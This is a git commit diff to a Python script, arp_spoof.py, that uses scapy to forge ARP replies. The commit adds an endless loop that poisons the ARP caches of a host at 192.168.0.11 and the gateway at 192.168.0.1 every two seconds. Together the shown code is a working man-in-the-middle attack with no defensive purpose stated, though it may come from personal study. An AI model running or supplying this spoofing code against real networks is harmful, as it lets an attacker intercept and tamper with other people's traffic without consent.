23307d978f5466d85a5da69a6d67c03dcf41d950
root <mbakulin103@gmail.com>
2023-04-04 12:55:27 -0400

    commit_2

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,6 +1,8 @@
 #!/usr/bin/env python
+import time
 
 import scapy.all as scapy
+import time
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -13,3 +15,8 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
+
+while True:
+    spoof('192.168.0.11', '192.168.0.1')
+    spoof('192.168.0.1', '192.168.0.11')
+    time.sleep(2)
